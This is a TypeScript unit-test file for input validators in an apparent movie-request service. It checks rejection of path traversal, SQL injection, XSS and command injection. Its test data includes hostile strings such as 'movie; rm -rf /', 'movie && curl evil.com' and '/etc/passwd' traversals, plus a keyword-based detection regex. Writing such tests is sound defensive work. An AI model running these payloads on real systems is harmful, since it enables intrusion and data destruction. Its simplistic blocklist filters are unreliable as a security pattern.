// Essential validation functions for security-critical operations
const validateNumeric = (value: number, field: string) => {
  if (Number.isNaN(value) || !Number.isFinite(value)) {
    throw new Error(`${field} must be a valid finite number`)
  }
  if (field === 'tmdbId' || field === 'qualityProfileId') {
    if (value <= 0 || !Number.isInteger(value) || value > 999999999) {
      throw new Error(`${field} must be a positive integer within valid range`)
    }
  }
  return true
}

const validateRootFolderPath = (path: string) => {
  if (path.includes('..') || path.includes('\u0000')) {
    throw new Error('Path traversal or null byte detected')
  }
  if (path.includes('%2e%2e') || path.includes('%2f')) {
    throw new Error('URL encoded path traversal detected')
  }
  try {
    const decoded = decodeURIComponent(path)
    if (decoded.includes('../')) {
      throw new Error('Decoded path traversal detected')
    }
  } catch {
    throw new Error('Invalid URL encoding in path')
  }
  return true
}

const sanitizeSearchTerm = (term: string) => {
  if (term.includes('\x00')) throw new Error('Null byte detected')
  if (term.match(/('|"|;|--|drop\s+table|<script|javascript:)/i)) {
    throw new Error('Potential injection attack detected')
  }
  return term
}

const validateUrl = (url: unknown) => {
  if (!url || typeof url !== 'string') {
    throw new Error('URL must be a non-empty string')
  }
  if (
    url.startsWith('javascript:') ||
    url.startsWith('data:') ||
    url.startsWith('file:') ||
    url.startsWith('ftp:')
  ) {
    throw new Error('URL must use HTTP or HTTPS protocol')
  }
  try {
    const parsedUrl = new URL(url)
    if (!['http:', 'https:'].includes(parsedUrl.protocol)) {
      throw new Error('Invalid protocol')
    }
    if (url.includes('\x00') || url.includes('../')) {
      throw new Error('URL contains dangerous content')
    }
  } catch (error) {
    if (error instanceof TypeError) throw new Error('Invalid URL format')
    throw error
  }
  return true
}

const validateRequestData = (jsonString: string) => {
  try {
    const parsed = JSON.parse(jsonString)
    if (!parsed.title) throw new Error('Title is required')
    if (
      parsed.year !== undefined &&
      (typeof parsed.year !== 'number' || !Number.isInteger(parsed.year))
    ) {
      throw new Error('Year must be an integer')
    }
    return parsed
  } catch (error) {
    if (error instanceof SyntaxError) throw new Error('Invalid JSON format')
    throw error
  }
}

describe('Security-Critical Input Validation', () => {
  describe('Business Rule Validation', () => {
    it('should enforce valid year ranges for media content', () => {
      const validateYear = (year: number) => {
        if (year < 1900 || year > 2100) {
          throw new Error(
            `Invalid year: ${year}. Must be between 1900 and 2100.`,
          )
        }
        return true
      }

      // Critical boundary tests
      expect(() => validateYear(1899)).toThrow()
      expect(() => validateYear(2101)).toThrow()
      expect(() => validateYear(1900)).not.toThrow()
      expect(() => validateYear(2024)).not.toThrow()
      expect(() => validateYear(2100)).not.toThrow()
    })

    it('should handle internationalization requirements', () => {
      const validateTitle = (title: string) => {
        if (title.includes('\u0000')) throw new Error('Null byte detected')
        if (/^[\u200B\u200C\u200D]+$/.test(title))
          throw new Error('Zero-width only')
        return title.length > 0
      }

      expect(validateTitle('Attack on Titan 進撃の巨人')).toBe(true)
      expect(validateTitle('Movie with 🎬 emoji')).toBe(true)
      expect(() => validateTitle('Test\u0000')).toThrow()
      expect(() => validateTitle('\u200B\u200C')).toThrow()
    })

    it('should enforce security-relevant string length limits', () => {
      const validateTitle = (title: string, maxLength = 255) => {
        if (!title) throw new Error('Title required')
        if (title.length > maxLength) throw new Error('Title too long')
        return true
      }

      expect(() => validateTitle('')).toThrow()
      expect(() => validateTitle('A'.repeat(256))).toThrow()
      expect(() => validateTitle('Valid Title')).not.toThrow()
    })

    it('should validate numeric inputs for business logic', () => {
      // Core business validation tests
      const numericTests = [
        { value: NaN, field: 'tmdbId', valid: false },
        { value: Infinity, field: 'tmdbId', valid: false },
        { value: -1, field: 'tmdbId', valid: false },
        { value: 0, field: 'tmdbId', valid: false },
        { value: 1, field: 'tmdbId', valid: true },
        { value: 999999, field: 'tmdbId', valid: true },
        { value: 1000000000, field: 'tmdbId', valid: false }, // Over limit
      ]

      numericTests.forEach(({ value, field, valid }) => {
        if (valid) {
          expect(() => validateNumeric(value, field)).not.toThrow()
        } else {
          expect(() => validateNumeric(value, field)).toThrow()
        }
      })
    })
  })

  describe('Security-Critical Validation', () => {
    it('should prevent path traversal attacks', () => {
      const pathTraversalTests = [
        '../../../etc/passwd',
        '/movies/../../../etc/passwd',
        '/movies/\u0000/etc/passwd',
        '/movies/%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      ]

      pathTraversalTests.forEach(path => {
        expect(() => validateRootFolderPath(path)).toThrow()
      })

      // Valid paths
      const validPaths = ['/movies/', '/tv-shows/', '/media/movies/2024/']
      validPaths.forEach(path => {
        expect(() => validateRootFolderPath(path)).not.toThrow()
      })
    })

    it('should prevent injection attacks in search terms', () => {
      const maliciousInputs = [
        "'; DROP TABLE movies; --",
        '<script>alert("XSS")</script>',
        'movie\x00injection',
        "movie' OR '1'='1",
      ]

      maliciousInputs.forEach((input: string) => {
        expect(() => sanitizeSearchTerm(input)).toThrow()
      })

      // Valid terms
      const validTerms = ['Avengers', 'The Matrix', 'Star Wars']
      validTerms.forEach((term: string) => {
        expect(() => sanitizeSearchTerm(term)).not.toThrow()
      })
    })

    it('should validate URL and ID formats for security', () => {
      const dangerousUrls = [
        'javascript:alert(1)',
        'data:text/html,<script>',
        'file:///etc/passwd',
        'http://localhost/../../../etc/passwd',
      ]

      dangerousUrls.forEach(url => {
        expect(() => validateUrl(url)).toThrow()
      })

      const invalidIds = [-1, 0, NaN, Infinity, '123']
      invalidIds.forEach(id => {
        expect(() => validateNumeric(id as number, 'tmdbId')).toThrow()
      })

      // Valid cases
      expect(() =>
        validateUrl('https://api.themoviedb.org/3/movie/550'),
      ).not.toThrow()
      expect(() => validateNumeric(12345, 'tmdbId')).not.toThrow()
    })

    it('should handle malformed JSON securely', () => {
      const malformedJsonTests = [
        '{"title": }', // Missing value
        '{"title": null}',
        '{"title": undefined}',
        'null',
        '[]',
      ]

      malformedJsonTests.forEach(json => {
        expect(() => validateRequestData(json)).toThrow()
      })

      // Valid JSON should pass
      expect(() =>
        validateRequestData('{"title": "Test Movie", "year": 2024}'),
      ).not.toThrow()
    })
  })

  describe('Injection Attack Prevention', () => {
    it('should detect command injection patterns', () => {
      const preventCommandInjection = (query: string) => {
        if (/[;&|`$()]|\b(rm|curl|wget|cat)\b/i.test(query)) {
          throw new Error('Command injection detected')
        }
        return true
      }

      const commandTests = [
        'movie; rm -rf /',
        'movie && curl evil.com',
        'movie | cat /etc/passwd',
        'movie `whoami`',
      ]

      commandTests.forEach((test: string) => {
        expect(() => preventCommandInjection(test)).toThrow()
      })

      const validQueries = ['The Matrix', 'Star Wars']
      validQueries.forEach((valid: string) => {
        expect(() => preventCommandInjection(valid)).not.toThrow()
      })
    })

    it('should prevent script injection in user input', () => {
      const preventScriptInjection = (input: string) => {
        if (/<script|javascript:|onerror=|onload=/i.test(input)) {
          throw new Error('Script injection detected')
        }
        return true
      }

      const scriptTests = [
        '<script>alert("XSS")</script>',
        '<img onerror="alert(1)">',
        'javascript:alert(1)',
        '<body onload="alert(1)">',
      ]

      scriptTests.forEach((test: string) => {
        expect(() => preventScriptInjection(test)).toThrow()
      })

      const validInputs = ['The Avengers', 'Star Wars']
      validInputs.forEach((valid: string) => {
        expect(() => preventScriptInjection(valid)).not.toThrow()
      })
    })
  })

  describe('Edge Case Handling', () => {
    it('should handle special Unicode characters appropriately', () => {
      const testCases = [
        { input: 'Café', valid: true },
        { input: 'Naïve', valid: true },
        { input: '北京', valid: true },
        { input: 'Movie\u0000Title', valid: false }, // Null byte
        { input: '\u200B\u200C\u200D', valid: false }, // Zero-width only
      ]

      testCases.forEach(({ input, valid }) => {
        const hasNullByte = input.includes('\u0000')
        const isOnlyZeroWidth = /^[\u200B\u200C\u200D]+$/.test(input)

        if (valid && !hasNullByte && !isOnlyZeroWidth) {
          expect(input.length).toBeGreaterThan(0)
        } else {
          expect(hasNullByte || isOnlyZeroWidth).toBe(true)
        }
      })
    })

    it('should handle empty and null values securely', () => {
      expect(() => validateUrl('')).toThrow()
      expect(() => validateUrl(null)).toThrow()
      expect(() => validateUrl(undefined)).toThrow()

      expect(() => validateRequestData('')).toThrow()
      expect(() => sanitizeSearchTerm('')).not.toThrow() // Empty is allowed for search
    })
  })
})
